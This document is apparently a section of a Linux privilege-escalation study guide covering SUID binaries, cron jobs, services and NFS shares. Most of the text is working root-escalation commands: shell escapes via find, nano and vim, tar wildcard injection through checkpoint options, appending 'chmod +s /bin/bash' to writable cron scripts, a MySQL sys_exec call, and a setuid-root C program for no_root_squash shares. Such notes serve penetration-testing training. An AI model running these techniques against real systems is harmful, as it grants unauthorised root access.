# Programs, Jobs and Services

This section covers how to identify and exploit misconfigured programs, scheduled jobs, and services on Linux systems.

## SUID/SGID Binaries

SUID (Set User ID) and SGID (Set Group ID) binaries run with the privileges of the file owner/group.

### Finding SUID/SGID Binaries

```bash
# Find SUID binaries
find / -type f -perm -4000 -ls 2>/dev/null

# Find SGID binaries
find / -type f -perm -2000 -ls 2>/dev/null

# Find both SUID and SGID binaries
find / -type f -perm -u=s,g=s -ls 2>/dev/null
```

### Common SUID Binaries to Look For

- `sudo`
- `su`
- `passwd`
- `newgrp`
- `gpasswd`
- `chsh`
- `at`
- `mount`
- `umount`
- `pkexec`
- `find`
- `nano`
- `vim`
- `bash`

### Exploiting SUID Binaries

#### Using GTFOBins

Always check GTFOBins (https://gtfobins.github.io/) for known ways to exploit common Linux binaries.

Examples:

1. Using `find` with SUID:
```bash
find . -exec /bin/sh -p \; -quit
```

2. Using `nano` with SUID:
```bash
nano
^R^X
reset; sh 1>&0 2>&0
```

3. Using `vim` with SUID:
```bash
vim -c ':shell'
```

## Cron Jobs

Cron jobs are scheduled tasks that run automatically at specified intervals.

### Finding Cron Jobs

```bash
# System-wide cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.monthly/
ls -la /etc/cron.weekly/

# User cron jobs
crontab -l
```

### Exploiting Cron Jobs

1. Look for writable scripts executed by cron:
```bash
find /etc/cron* -type f -writable
```

2. Check for wildcards in cron jobs (command injection):
```bash
# If cron job uses tar with wildcards (e.g., tar czf /backup/*.tar /var/www/*)
cd /var/www/
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > exploit.sh
chmod +x exploit.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh exploit.sh"
# Wait for cron to execute
/tmp/bash -p
```

3. Example of injecting into a cron job script:
```bash
# If you find a writable script run by root in cron
echo 'chmod +s /bin/bash' >> /path/to/writable_cron_script.sh
# Wait for cron to execute
/bin/bash -p
```

## Services

### Identifying Running Services

```bash
# List running services
ps aux
service --status-all
systemctl list-units --type=service

# Check specific service status
service apache2 status
```

### Service Misconfigurations

1. Check for writable service files:
```bash
find /etc/systemd/system -writable
find /lib/systemd/system -writable
find /usr/lib/systemd/system -writable
```

2. Check for writable service executables:
```bash
systemctl status service_name
# Note the path of the executable from the output
ls -la /path/to/service_binary
```

### MySQL Running as Root

If MySQL is running as root, it can be exploited:

```bash
mysql -u root -p
# After logging in
SELECT sys_exec('chmod +s /bin/bash');
exit
/bin/bash -p
```

## NFS Shares

Network File System (NFS) shares can be exploited if misconfigured.

### Identifying NFS Shares

```bash
# On the target
cat /etc/exports
showmount -e localhost

# From another machine
showmount -e target_ip
```

### Exploiting no_root_squash

If a share has the `no_root_squash` option, you can create SUID binaries on it:

```bash
# From attacker machine (as root)
mkdir /tmp/nfs
mount -t nfs target_ip:/vulnerable/share /tmp/nfs
cd /tmp/nfs
cat > exploit.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF
gcc exploit.c -o exploit
chmod +s exploit
# Now on the target, execute /vulnerable/share/exploit
```

## Additional Resources

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries that can be exploited
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [LOLBAS](https://lolbas-project.github.io/) - Similar to GTFOBins, but for Windows 